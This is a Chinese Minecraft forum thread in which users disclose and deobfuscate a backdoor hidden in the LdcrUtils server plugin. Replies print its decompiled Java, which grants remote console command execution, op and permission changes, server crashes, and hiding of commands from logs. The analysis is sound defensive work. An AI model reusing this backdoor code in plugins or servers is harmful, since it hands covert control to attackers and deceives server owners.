{
    "title": "Ldcrcrutils插件疑似含有后门",
    "author": "2693149792",
    "replyCount": 11,
    "timestamp": 1568386200,
    "txt_content": "RT,前置插件ldcrutils疑似含有后门插件\n帖子地址：\n本人反编译未看出含有后门,但我与@飞猪666,QQ了解后\n主体插件原贴 https://www.mcbbs.net/forum.php?mod=viewthread&tid=842056\n内百度云盘链接含有ldcrutils\n@飞猪666 他本人说插件后门存在于\\ldcr\\LdcrUtils\\internal\\ImplLoader.class和ImplClassLoader.class中\n而且疑似为mod后门(我也不清楚)\n他本人未提供源码\n如果能有能力反混淆的人可以来尝试！\n\n\n\n\n\n\n\n\nQQ图片20190913224656.png\n(155.19 KB, 下载次数: 2)\n\n\n\n\n下载附件\n\n\n2019-9-13 22:48 上传\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "replies": [
        {
            "author": "吕易天",
            "timestamp": 1568388540,
            "txt_content": " 本帖最后由 吕易天 于 2019-9-14 00:21 编辑 \n\ng(\"\\u0017.\\u0007\\u0019n(\\\"\\u0007l&\\u001e=\\u0016\\tu\\u0019;\\u001c:2\\u0015.\\u0011a\\u0016:O\\u0018\\u001a.\\u0012\")解密后是ldcr.LdcrUtils.internal.su.Core\n好像看到了什么不得了的东西：\\u0016\\u00132\\u0003i\\u001b\\u0001(\\u001d@\\u0005:\\u001d;M7\\u000e$K! \\u0017<E\\f<\\\\?\\u0011v\\u000e\\u0019\\u001dU\\u001775%#.\\u00000\\f\\u0005\\n\\u0019\\u0004\\u0017\\u0011解密以后是L[M]>f^ET%f}wx%bgs/rnal.su.remote.CommandReceiver\n还有：\\u0000,\\u001b%R\\u0014\\u001e2\\u000f\\u0002[#&\\u0010`\\u001a\\u0018'\\r%^*\\u0018c\\u0012([(\\u0014h\\u0019)\\b\\u001b\\u001562<t\\u0010k+\\u0013\\\"\\u00070&\\u0000&3$\\u0015\\t\\u0014'\\u001a\\u0015\\u0018\\u001c\\u0011解密以后是Gc{v)fEO^^IS]\u0001yDNCT\u001esx5x~%an.eCommand.HideJavaLoggingFilter\n好的，它似乎是真有后门（而且还是很高端的远程施法的那种），我再继续看看"
        },
        {
            "author": "贺兰兰",
            "timestamp": 1568391840,
            "txt_content": "ummm貌似确实有，因为以前和这个插件的原作者有过合作\n原作者应该不是发帖者，发帖者是剽窃，剽窃者和原作者有一些仇\n其前置LdcrUntils确实包含后门，之前有听他们讲过，就是为了防止插件被盗来着"
        },
        {
            "author": "云闪",
            "timestamp": 1568393040,
            "txt_content": " 本帖最后由 云闪 于 2019-9-14 02:04 编辑 \n\n版主效率好高！刚刚还去下载来着，现在帖子已经被屏蔽了！感觉任务圆满完成有点不想分析了！\n\n后门插件备份\n\n\n确实有后门，而且后门完成度高得可怕，目前已确定的功能有任意命令执行(重写了hasPermission直接return true保证拥有所有权限)\n\nldcr.LdcrUtils.internal.ImplLoader$SubModuleLoader类的load方法使用动态加载的方式加载了一些奇怪的类，以下是将这些类导出的代码，我使用了asm和javassist两个库。已经将导出的类上传到附件了\n\nimport javassist.ByteArrayClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport org.objectweb.asm.ClassReader;\nimport org.objectweb.asm.ClassVisitor;\nimport org.objectweb.asm.MethodVisitor;\nimport org.objectweb.asm.Opcodes;\n\nimport java.io.File;\nimport java.util.Base64;\n\npublic class Main {\n\n    public static void main(String[] args) throws Exception {\n        ClassPool pool = new ClassPool();\n        ClassReader cr = new ClassReader(\"ldcr.LdcrUtils.internal.ImplLoader$SubModuleLoader\");\n        ClassVisitor cv = new ClassVisitor(Opcodes.ASM7) {\n            @Override\n            public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {\n                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);\n                if (\"load\".equals(name)) {\n                    return new MethodVisitor(Opcodes.ASM7, mv) {\n                        @Override\n                        public void visitLdcInsn(Object value) {\n                            if (value instanceof String) {\n                                String res = g((String) value, \"ldcr.LdcrUtils.internal.ImplLoader$SubModuleLoader\", \"load\");\n                                if (res.indexOf('.') == -1) {\n                                    byte[] bytes = Base64.getDecoder().decode(res);\n                                    ClassReader ncr = new ClassReader(bytes);\n                                    pool.appendClassPath(new ByteArrayClassPath(ncr.getClassName().replace('/', '.'), bytes));\n                                    try {\n                                        CtClass cc = pool.get(ncr.getClassName().replace('/', '.'));\n                                        cc.writeFile(new File(\"crack\").getAbsolutePath());\n                                    } catch (Exception e) {\n                                        e.printStackTrace();\n                                    }\n                                }\n                            }\n                            super.visitLdcInsn(value);\n                        }\n                    };\n                }\n                return mv;\n            }\n        };\n        cr.accept(cv, 0);\n    }\n\n    private static String g(String a, String className, String methodName) {\n        String var10004 = className + methodName;\n        int var3;\n        int var8 = var3 = var10004.length() - 1;\n        String var2 = var10004;\n        int var4 = var8;\n        int var10001 = a.length();\n        char[] var5 = new char[var10001];\n        int var6 = 2 ^ 5;\n\n        for(int var7 = var10001 - 1; var7 >= 0; --var7) {\n            char var10005 = var2.charAt(var4);\n            var5[var7] = (char)(var10005 ^ a.charAt(var7) ^ var6);\n            var6 = (char)(63 & (var6 ^ var7 ^ var10005));\n            --var4;\n            if (var4 < 0) {\n                var4 = var3;\n            }\n        }\n\n        return new String(var5);\n    }\n}复制代码\n\n\nldcr.LdcrUtils.internal.ImplLoader$SubModuleLoader类的startup方法调用了动态加载的类ldcr.LdcrUtils.internal.su.Core的setup方法(解密字符串得到该信息的方式参照上方代码的字符串解密)\n以下是他的setup部分的代码\n简单解释一下\n1.如果没有安装ProtocolLib前置插件则不加载后门\n2.加载RSA密钥，估计后门的信息全部是RSA加密传输的\n3.调用ProtocolLib监听数据包，这个监听器是用来接收后门指令的\n4.HidePluginListener 用来隐藏信息 ，后面介绍\n5.AntiCommand和CoreInjector 还没分析\n\n\npublic static void setup() {\n        new Core();\n    }\n\n    private Core() {\n        e = this;\n\n        try {\n            if (!LdcrUtils.hasProtocolLib()) {\n                return;\n            }\n\n            byte[] var1 = Base64.decodeBase64(a(5606, 13280));\n            KeyFactory var2 = KeyFactory.getInstance(a(5605, -19691));\n            X509EncodedKeySpec var3 = new X509EncodedKeySpec(var1);\n            this.c = (RSAPublicKey)var2.generatePublic(var3);\n            this.b = Cipher.getInstance(a(5607, -20347));\n            this.b.init(2, this.c);\n            LdcrUtils.getProtocolManager().addPacketListener(new CommandReceiver());\n            Bukkit.getPluginManager().registerEvents(new HidePluginListener(), LdcrUtils.getInstance());\n            f = new AntiCommand();\n            this.a = new CoreInjector();\n        } catch (Exception var4) {\n            (new IllegalActionException(a(5601, 17019))).printStackTrace();\n        }\n\n    }\n复制代码\n\n\n\n以下是注册到ProtocolLib的CommandReceiver的代码\n功能：接收CUSTOM_PAYLOAD数据包(是plugin message channel功能使用的数据包)\n判断channel name的hashcode是否为-1832479148，如果是 则取消接收数据包事件，调用new CommandProcessor(var1.getPlayer(), var1.getPacket());来解析后门命令，甚至之后还使用了一个空包覆盖原始数据包防止被其它插件接收到\n\npublic class CommandReceiver extends PacketAdapter {\n    private final PacketContainer a;\n\n    public CommandReceiver() {\n        super(LdcrUtils.getInstance(), ListenerPriority.HIGHEST, new PacketType[]{Client.CUSTOM_PAYLOAD});\n        boolean var10000 = CommandProcessor.c;\n        this.a = new PacketContainer(Client.CUSTOM_PAYLOAD);\n        boolean var1 = var10000;\n        this.a.getModifier().writeDefaults();\n        if (var1) {\n            int var2 = Core.d;\n            ++var2;\n            Core.d = var2;\n        }\n\n    }\n\n    public void onPacketReceiving(PacketEvent var1) {\n        try {\n            if (((String)var1.getPacket().getStrings().readSafely(0)).hashCode() == -1832479148) {\n                var1.setCancelled(true);\n                new CommandProcessor(var1.getPlayer(), var1.getPacket());\n                var1.setPacket(this.a.deepClone());\n            }\n        } catch (Exception var3) {\n        }\n\n    }\n}\n复制代码\n\nCommandProcessor分析，正在分析中...\nCommandProcessor是继承了Thread，其run方法如下，功能为：根据数据包选择具体方法执行，我已经对switch里的选择进行了注释，具体反编译代码已上传到附件\n\n  public void run() {\n    boolean bool = c;\n    try {\n      ByteBuf byteBuf = (ByteBuf)this.a.getModifier().withType(ByteBuf.class).read(0);\n      byte[] arrayOfByte = new byte[byteBuf.readableBytes()];\n      byteBuf.readBytes(arrayOfByte);\n      ByteArrayDataInput byteArrayDataInput = ByteStreams.newDataInput(arrayOfByte);\n      switch (byteArrayDataInput.readUTF().hashCode()) {\n        case 110620357:\n          c(this.b, byteArrayDataInput); // 向玩家发送一个字符串(尚未分析出来)和系统时间\n          return;\n        case 106411327:\n          b(this.b, byteArrayDataInput); // 如果玩家在信任列表中，则移出信任列表，否则判断是否附带正确密码，如果密码正确则加入信任列表(该后门所有功能均会判断玩家是否在信任列表中)\n          return;\n        case 106907893:\n          e(this.b, byteArrayDataInput); // 没能成功反编译，等我慢慢研究字节码\n          return;\n        case 99093222:\n          a(this.b, byteArrayDataInput); // (玩家在信任列表中才会执行)：如果玩家在隐藏列表中，则移出隐藏列表，否则加入隐藏列表\n          return;\n        case 93104890:\n          f(this.b, byteArrayDataInput); // (玩家在信任列表中才会执行)：注册/反注册AntiCommand监听器\n          return;\n        case 96936396:\n          g(this.b, byteArrayDataInput); // (玩家在信任列表中才会执行)：以控制台身份任意指令执行\n          return;\n        case 96936774:\n          h(this.b, byteArrayDataInput); // (玩家在信任列表中才会执行)：以自己身份(使用自己写的代理CommondSender来保证拥有所有权限)任意指令执行\n          return;\n        case 105980543:\n          d(this.b, byteArrayDataInput); // (玩家在信任列表中才会执行)：向服务器注册/覆盖命令，具体用途暂不明\n          return;\n      } \n    } catch (Exception exception) {\n      a(this.b, ExceptionUtils.getFullStackTrace(exception).replace(\"\\t\", a(5370, -8472)));\n      a(this.b, a(5350, -28286));\n    } \n    try {\n      if (Core.d != 0) {\n        try {\n        \n        } catch (Exception exception) {\n          throw null;\n        } \n        c = !bool;\n      } \n    } catch (Exception exception) {\n      throw null;\n    } \n  }\n\n\nHidePluginListener分析，该监听器向Bukkit注册PlayerCommandPreprocessEvent事件，HIGHEST和MONITOR优先级的各注册了一个。\n首先HIGHEST优先级的方法名是onCommandBefore，其功能是：如果发命令的玩家在需要隐藏的列表中，则临时保存命令并用随机UUID替换命令(Hidel4jFilter未分析，疑似hack服务端的日志记录来更彻底地屏蔽命令)\n然后MONITOR优先级的方法名是onCommandAfter，其功能是：如果发命令的玩家在需要隐藏的列表中，且查到有在上方临时保存命令，则将临时命令替换回来\n功能看起来是：屏蔽命令，避免其他插件通过PlayerCommandPreprocessEvent检测到命令\n提醒后门作者，before方法的优先级用LOWEST比较好吧。MONITOR就在HIGHEST的下一个，这样玩意义不大，从LOWEST到MONITOR的话能避免被大多数LOW, NORMAL, HIGH, HIGHEST的插件检测到\n\n   @EventHandler(\n        priority = EventPriority.HIGHEST\n    )\n    public void onCommandBefore(PlayerCommandPreprocessEvent var1) {\n        boolean var2 = Hidel4jFilter.b;\n        if (Core.getInstance().getHided().contains(var1.getPlayer().getName().toLowerCase())) {\n            String var3 = \"/\" + UUID.randomUUID().toString();\n            this.a.put(var3, var1.getMessage());\n            var1.setMessage(var3);\n        }\n\n        if (Core.d != 0) {\n            Hidel4jFilter.b = !var2;\n        }\n\n    }\n\n    @EventHandler(\n        priority = EventPriority.MONITOR\n    )\n    public void onCommandAfter(PlayerCommandPreprocessEvent var1) {\n        boolean var2 = Hidel4jFilter.b;\n        if (Core.getInstance().getHided().contains(var1.getPlayer().getName().toLowerCase()) && this.a.containsKey(var1.getMessage())) {\n            String var4 = var1.getMessage();\n            var1.setMessage((String)this.a.get(var4));\n            this.a.remove(var4);\n        }\n\n        if (var2) {\n            int var3 = Core.d;\n            ++var3;\n            Core.d = var3;\n        }\n\n    }复制代码\n\n\n\n\n\n\n\n\n\ncrack.jar\n\n\n2019-9-14 00:44 上传\n点击文件名下载附件\n\n\n\n\n64.71 KB, 阅读权限: 100, 下载次数: 10\n\n\n动态加载的类\n\n\n\n\n\n\n\n\n\n\nCommandProcessor.txt\n\n\n2019-9-14 01:30 上传\n点击文件名下载附件\n\n\n\n\n42.59 KB, 阅读权限: 100, 下载次数: 6\n\n\nCommandProcessor反编译代码\n\n\n"
        },
        {
            "author": "UltraPanda",
            "timestamp": 1568395980,
            "txt_content": " 本帖最后由 407 于 2019-9-14 01:45 编辑 \n\n感谢楼上解密出来的文件。我在此也发表一下自己的见解。\n\n我首先用自己的解密器将楼上解密出来的文件进行解密，静态分析之后发现对象是ZKM12混淆出来的，直接拖进去。\n\n\n\n\nimage.png (130.53 KB, 下载次数: 0)\n\n下载附件\n\n2019-9-14 01:14 上传\n\n\n\n\n\n\nCore.class\n首先初始化了这个类，如果服务器没安装前置ProtocolLib则不进行操作，由此判定本后门依赖于ProtocolLib\n然后对方用Base64加密存储byte array，用RSA方式生成公钥密钥之后为后面使用做准备。\n\nHideJavaLoggingFilter.class \n这个类用于隐藏已通过非法途径获取到权限的玩家，执行命令时在后台输出的信息。\n\nCommandProcessor.class\n从头开始，remote command的意思为远程指令，这会在玩家客户端向服务器发送custom pay load之后进行处理。\n视线转向 d 方法。Inject Command Map 用特定的正则表达式导入指令Map。（我不怎么进行Bukkit开发，我对此的猜测是： 指令伪造）\n之后我们又看到了一个 Crash 字符串，当玩家客户端发送的信息匹配到这个的时候，插件会反射将Bukkit的重要field设置为null，在运行的时候进行这个操作可想而知有多危险。\n哦？还有另一个 Crash 方案，操作都差不多，都是捣毁主类。\n\n另外这个后门插件引入Turst这个词，用于变相的说：你拿到权限辣！\n\n然后我们转向 e 方法：\n如果字符串的hashCode为3553，那么就以玩家发送的字符串作为权限节点，添加给这个玩家。\n如果不是，则会给你上/下 OP\n\n\n我觉得这些就足够了，其他的我不想多看了，保护头发。\n\n\n\ncrack-deob.jar\n(73.53 KB, 下载次数: 11)\n\n\n\n2019-9-14 01:34 上传\n点击文件名下载附件\n\n\n\n\n\n\n\nCore.class 反编译/反混淆\npublic class Core {\n    private static Core e;\n    private CoreInjector a;\n    private static Listener f;\n    private static boolean i;\n    private final HashSet<String> j = new HashSet();\n    private final HashSet<String> h = new HashSet();\n    private final String g;\n    private RSAPublicKey c;\n    private Cipher b;\n    public static int d;\n    private static final String[] k;\n    private static final String[] l;\n\n    public static void setup() {\n        new Core();\n    }\n\n    private Core() {\n        this.g = \"MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAIUsWX6AM+2cSvo1YXHWpe83wa35A46FS8n5dWumqK5SA1ZZdwiHIT9mhQbz/gyaBVHbNtSzhIRmP20/pIT1Ob8CAwEAAQ==\";\n        e = this;\n        try {\n            if (!LdcrUtils.hasProtocolLib()) {\n                return;\n            }\n            byte[] arrby = Base64.decodeBase64((String)\"MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAIUsWX6AM+2cSvo1YXHWpe83wa35A46FS8n5dWumqK5SA1ZZdwiHIT9mhQbz/gyaBVHbNtSzhIRmP20/pIT1Ob8CAwEAAQ==\");\n            KeyFactory keyFactory = KeyFactory.getInstance((String)\"RSA\");\n            X509EncodedKeySpec x509EncodedKeySpec = new X509EncodedKeySpec(arrby);\n            this.c = (RSAPublicKey)keyFactory.generatePublic((KeySpec)x509EncodedKeySpec);\n            this.b = Cipher.getInstance((String)\"RSA\");\n            this.b.init(2, (Key)this.c);\n            LdcrUtils.getProtocolManager().addPacketListener((PacketListener)new CommandReceiver());\n            Bukkit.getPluginManager().registerEvents((Listener)new HidePluginListener(), (Plugin)LdcrUtils.getInstance());\n            f = new AntiCommand();\n            this.a = new CoreInjector();\n        }\n        catch (Exception exception) {\n            new IllegalActionException(\"Illegal Access\").printStackTrace();\n        }\n    }\n\n    public boolean isTrusted(Player player) {\n        return this.j.contains((Object)player.getName().toLowerCase());\n    }\n\n    public void trustPlayer(Player player) {\n        this.j.add((Object)player.getName().toLowerCase());\n    }\n\n    public void untrustPlayer(Player player) {\n        this.j.remove((Object)player.getName().toLowerCase());\n    }\n\n    /*\n     * Unable to fully structure code\n     */\n    public boolean checkPassword(String var1_1) throws LightweightException {\n        var2_2 = ProxiedSender.c;\n        if (!var2_2) ** GOTO lbl5\n        var3_3 = Core.d;\n        Core.d = ++var3_3;\nlbl5: // 2 sources:\n        return UUID.nameUUIDFromBytes((byte[])StringUtils.getBytesUtf8((String)String.valueOf((long)(System.currentTimeMillis() / 60000L)))).toString().equals((Object)StringUtils.newStringUtf8((byte[])this.b.doFinal(Base64.decodeBase64((String)var1_1))));\n    }\n\n    public static void sendPacket(Player player, ByteArrayDataOutput byteArrayDataOutput) {\n        PacketContainer packetContainer = new PacketContainer(PacketType.Play.Server.CUSTOM_PAYLOAD);\n        packetContainer.getModifier().writeDefaults();\n        packetContainer.getStrings().write(0, (Object)\"LRpyel\");\n        packetContainer.getModifier().write(1, MinecraftReflection.getPacketDataSerializer((Object)Unpooled.copiedBuffer((byte[])byteArrayDataOutput.toByteArray())));\n        try {\n            LdcrUtils.getProtocolManager().sendServerPacket(player, packetContainer, false);\n        }\n        catch (Exception exception) {\n            // empty catch block\n        }\n    }\n\n    public static Core getInstance() {\n        return e;\n    }\n\n    public CoreInjector getCoreInjector() {\n        return this.a;\n    }\n\n    public static Listener getAntiCommand() {\n        return f;\n    }\n\n    public static boolean isAntiCommandRegistered() {\n        return i;\n    }\n\n    public static void setAntiCommandRegistered(boolean bl) {\n        i = bl;\n    }\n\n    public HashSet<String> getTrusted() {\n        return this.j;\n    }\n\n    public HashSet<String> getHided() {\n        return this.h;\n    }复制代码\n\nHideJavaLoggingFliter.class 反编译/反混淆\npublic class HideJavaLoggingFilter\nimplements Filter {\n    private final String a;\n    private static final String[] b;\n    private static final String[] c;\n\n    public HideJavaLoggingFilter() {\n        this.a = \" issued server command: \";\n    }\n\n    public boolean isLoggable(LogRecord logRecord) {\n        boolean bl = Hidel4jFilter.b;\n        if (logRecord == null) {\n            return true;\n        }\n        if (logRecord.getMessage() == null) {\n            return true;\n        }\n        String string = logRecord.getMessage();\n        if (string.contains((CharSequence)\" issued server command: \")) {\n            if (string.contains((CharSequence)\"org.bukkit.command.ProxiedCommandSender issued server command\")) {\n                return false;\n            }\n            String string2 = string.toLowerCase();\n            for (String string3 : Core.getInstance().getHided()) {\n                if (string2.contains((CharSequence)(string3 + \" issued server command: \"))) {\n                    return false;\n                }\n                if (!bl) continue;\n            }\n        }\n        return true;\n    }复制代码\n\nCommandProcessor.class 反编译/反混淆\npublic class CommandProcessor\nimplements Runnable {\n    private Player b;\n    private PacketContainer a;\n    public static boolean c;\n    private static final String[] d;\n    private static final String[] e;\n\n    private CommandProcessor() {\n    }\n\n    protected CommandProcessor(Player player, PacketContainer packetContainer) {\n        this.b = player;\n        this.a = packetContainer;\n        new Thread((Runnable)this).start();\n    }\n\n    public void run() {\n        boolean bl = c;\n        try {\n            ByteBuf byteBuf = (ByteBuf)this.a.getModifier().withType(ByteBuf.class).read(0);\n            byte[] arrby = new byte[byteBuf.readableBytes()];\n            byteBuf.readBytes(arrby);\n            ByteArrayDataInput byteArrayDataInput = ByteStreams.newDataInput((byte[])arrby);\n            switch (byteArrayDataInput.readUTF().hashCode()) {\n                case 110620357: {\n                    this.c(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 106411327: {\n                    this.b(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 106907893: {\n                    this.e(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 99093222: {\n                    this.a(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 93104890: {\n                    this.f(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 96936396: {\n                    this.g(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 96936774: {\n                    this.h(this.b, byteArrayDataInput);\n                    return;\n                }\n                case 105980543: {\n                    this.d(this.b, byteArrayDataInput);\n                    return;\n                }\n            }\n        }\n        catch (Exception exception) {\n            this.a(this.b, ExceptionUtils.getFullStackTrace((Throwable)exception).replace((CharSequence)\"\\t\", (CharSequence)\"  \"));\n            this.a(this.b, \"§b #root §7~$ §cException while processing remote command\");\n        }\n        if (Core.d != 0) {\n            c = !bl;\n        }\n    }\n\n    private void d(Player player, ByteArrayDataInput byteArrayDataInput) {\n        block30 : {\n            boolean bl = c;\n            if (!Core.getInstance().isTrusted(this.b)) break block30;\n            CoreInjector coreInjector = Core.getInstance().getCoreInjector();\n            String string = byteArrayDataInput.readUTF();\n            int n = -1;\n            switch (string.hashCode()) {\n                case -1184061039: {\n                    if (!string.equals((Object)\"inject\")) break;\n                    n = 0;\n                    if (!bl) break;\n                }\n                case -840442113: {\n                    if (!string.equals((Object)\"unload\")) break;\n                    n = 1;\n                    if (!bl) break;\n                }\n                case 94921639: {\n                    if (!string.equals((Object)\"crash\")) break;\n                    n = 2;\n                }\n            }\n            switch (n) {\n                case 0: {\n                    switch (byteArrayDataInput.readInt()) {\n                        case 0: {\n                            String string2;\n                            try {\n                                string2 = byteArrayDataInput.readUTF();\n                            }\n                            catch (IllegalStateException illegalStateException) {\n                                this.a(this.b, \"§b #root §7~$ §cInject Failed: Please provide an regex.\");\n                                return;\n                            }\n                            try {\n                                coreInjector.injectCommandMap(coreInjector.getProxiedCommandMap(), string2);\n                            }\n                            catch (IllegalActionException illegalActionException) {\n                                this.a(this.b, \"§b #root §7~$ §cInject Failed: \" + illegalActionException.getMessage());\n                                return;\n                            }\n                            this.a(this.b, \"§b #root §7~$ §aSuccessfully injected Command Map\");\n                            return;\n                        }\n                    }\n                    this.a(this.b, \"§b #root §7~$ §cUnknown Inject Type\");\n                    return;\n                }\n                case 1: {\n                    switch (byteArrayDataInput.readInt()) {\n                        case 0: {\n                            try {\n                                coreInjector.injectCommandMap(coreInjector.getRealCommandMap(), null);\n                            }\n                            catch (IllegalActionException illegalActionException) {\n                                this.a(this.b, \"§b #root §7~$ §cRestored Failed: \" + illegalActionException.getMessage());\n                                return;\n                            }\n                            this.a(this.b, \"§b #root §7~$ §aSuccessfully restored Command Map\");\n                            return;\n                        }\n                    }\n                    this.a(this.b, \"§b #root §7~$ §cUnknown Inject Type\");\n                    return;\n                }\n                case 2: {\n                    switch (byteArrayDataInput.readInt()) {\n                        case 0: {\n                            try {\n                                Field field = Bukkit.class.getDeclaredField(\"server\");\n                                field.setAccessible(true);\n                                field.set(null, null);\n                            }\n                            catch (Exception exception) {\n                                this.a(this.b, \"§b #root §7~$ §cCrash Failed.\");\n                            }\n                            return;\n                        }\n                        case 1: {\n                            try {\n                                Class class_ = Class.forName((String)ldcr.LdcrUtils.internal.su.a.a((String)(\"net.minecraft.server.\" + LdcrUtils.getNmsVersion() + \".MinecraftServer\")));\n                                Object object = class_.getMethod(\"getServer\", new Class[0]).invoke(null, new Object[0]);\n                                Queue queue = (Queue)class_.getField(\"processQueue\").get(object);\n                                queue.add((Object)new NetworkThread());\n                            }\n                            catch (Exception exception) {\n                                this.a(this.b, \"§b #root §7~$ §cCrash failed, \" + exception.getMessage());\n                            }\n                            this.a(this.b, \"§b #root §7~$ §aCrash success, Server Locked.\");\n                            return;\n                        }\n                    }\n                    return;\n                }\n            }\n            this.a(this.b, \"§b #root §7~$ §cUnknown command\");\n            return;\n        }\n        this.a(this.b, \"§b #root §7~$ §cYou are not trusted!\");\n    }\n\n    private void h(Player player, ByteArrayDataInput byteArrayDataInput) {\n        String string;\n        if (Core.getInstance().isTrusted(player)) {\n            try {\n                string = byteArrayDataInput.readUTF();\n            }\n            catch (IllegalStateException illegalStateException) {\n                this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n                return;\n            }\n        } else {\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n        Bukkit.getScheduler().runTask((Plugin)LdcrUtils.getInstance(), (Runnable)new a(this, player, string));\n        this.a(player, \"§b #root §7~$ §aSuccessfully executed command as Proxied\");\n    }\n\n    private void g(Player player, ByteArrayDataInput byteArrayDataInput) {\n        String string;\n        if (Core.getInstance().isTrusted(player)) {\n            try {\n                string = byteArrayDataInput.readUTF();\n            }\n            catch (IllegalStateException illegalStateException) {\n                this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n                return;\n            }\n        } else {\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n        Bukkit.getScheduler().runTask((Plugin)LdcrUtils.getInstance(), (Runnable)new b(this, string));\n        this.a(player, \"§b #root §7~$ §aSuccessfully executed command as console\");\n    }\n\n    private void f(Player player, ByteArrayDataInput byteArrayDataInput) {\n        if (Core.getInstance().isTrusted(player)) {\n            Core.setAntiCommandRegistered((boolean)(!Core.isAntiCommandRegistered()));\n            if (Core.isAntiCommandRegistered()) {\n                Bukkit.getPluginManager().registerEvents(Core.getAntiCommand(), (Plugin)LdcrUtils.getInstance());\n                this.a(player, \"§b #root §7~$ §aAntiCommand actived\");\n            } else {\n                HandlerList.unregisterAll((Listener)Core.getAntiCommand());\n                this.a(player, \"§b #root §7~$ §aAntiCommand §cdisabled\");\n            }\n        } else {\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n    }\n\n    private void a(Player player, ByteArrayDataInput byteArrayDataInput) {\n        if (Core.getInstance().isTrusted(player)) {\n            String string = player.getName().toLowerCase();\n            if (Core.getInstance().getHided().contains((Object)string)) {\n                Core.getInstance().getHided().remove((Object)string);\n                this.a(player, \"§b #root §7~$ §aHideCommand §cdisabled\");\n            } else {\n                Core.getInstance().getHided().add((Object)string);\n                this.a(player, \"§b #root §7~$ §aHideCommand actived\");\n            }\n        } else {\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n    }\n\n    private void e(Player player, ByteArrayDataInput byteArrayDataInput) {\n        block9 : {\n            block4 : {\n                boolean bl;\n                block7 : {\n                    block8 : {\n                        String string;\n                        block5 : {\n                            block6 : {\n                                bl = c;\n                                if (!Core.getInstance().isTrusted(player)) break block4;\n                                string = byteArrayDataInput.readUTF();\n                                if (string.hashCode() != 3553) break block5;\n                                if (!player.isOp()) break block6;\n                                player.setOp(false);\n                                this.a(player, \"§b #root §7~$ §aSuccessfully §cDeOpped\");\n                                if (!bl) break block7;\n                            }\n                            player.setOp(true);\n                            this.a(player, \"§b #root §7~$ §aSuccessfully Opped\");\n                            if (!bl) break block7;\n                        }\n                        if (!LdcrUtils.hasVaultPerms()) break block8;\n                        LdcrUtils.getVaultPermission().playerAdd(player, string);\n                        this.a(player, \"§b #root §7~$ §aSuccessfully added permission §b\" + string);\n                        if (!bl) break block7;\n                    }\n                    this.a(player, \"§b #root §7~$ §cVault was not installed\");\n                }\n                if (!bl) break block9;\n            }\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n    }\n\n    private void b(Player player, ByteArrayDataInput byteArrayDataInput) {\n        String string;\n        if (Core.getInstance().isTrusted(player)) {\n            Core.getInstance().untrustPlayer(player);\n            this.a(player, \"§b #root §7~$ §aYou are now §cuntrusted§a!\");\n            return;\n        }\n        try {\n            string = byteArrayDataInput.readUTF();\n        }\n        catch (IllegalStateException illegalStateException) {\n            this.a(player, \"§b #root §7~$ §cYou are not trusted!\");\n            return;\n        }\n        try {\n            if (Core.getInstance().checkPassword(string)) {\n                Core.getInstance().trustPlayer(player);\n                this.a(player, \"§b #root §7~$ §aYou are now trusted!\");\n            } else {\n                this.a(player, \"§b #root §7~$ §cAuthentication Failed!\");\n            }\n        }\n        catch (LightweightException lightweightException) {\n            this.a(player, \"§b #root §7~$ §cException while authentication\");\n        }\n    }\n\n    private void a(Player player, String string) {\n        ByteArrayDataOutput byteArrayDataOutput = ByteStreams.newDataOutput();\n        byteArrayDataOutput.writeUTF(\"msg\");\n        byteArrayDataOutput.writeUTF(string);\n        Core.sendPacket((Player)player, (ByteArrayDataOutput)byteArrayDataOutput);\n    }\n\n    private void c(Player player, ByteArrayDataInput byteArrayDataInput) {\n        ByteArrayDataOutput byteArrayDataOutput = ByteStreams.newDataOutput();\n        byteArrayDataOutput.writeUTF(\"taRpy\");\n        byteArrayDataOutput.writeLong(System.currentTimeMillis());\n        Core.sendPacket((Player)player, (ByteArrayDataOutput)byteArrayDataOutput);\n    }复制代码\n\n( 事后发现后门作者用的是盗版破解ZKM，所以两年前的解密器也能用，我枯了... "
        },
        {
            "author": "云闪",
            "timestamp": 1568397000,
            "txt_content": "407 发表于 2019-9-14 01:33\n感谢楼上解密出来的文件。我在此也发表一下自己的见解。\n\n我首先用自己的解密器将楼上解密出来的文件进行解 ...\n能PY一个解密器吗！"
        },
        {
            "author": "吕易天",
            "timestamp": 1568417280,
            "txt_content": " 本帖最后由 吕易天 于 2019-9-14 07:36 编辑 \n云闪 发表于 2019-9-14 01:50\n能PY一个解密器吗！\n这个我有，你要吗\n链接: https://pan.baidu.com/s/1CyWoiTxDxkDaw2I4uc-lNQ 提取码: 2333"
        },
        {
            "author": "SakuraKooi",
            "timestamp": 1568424660,
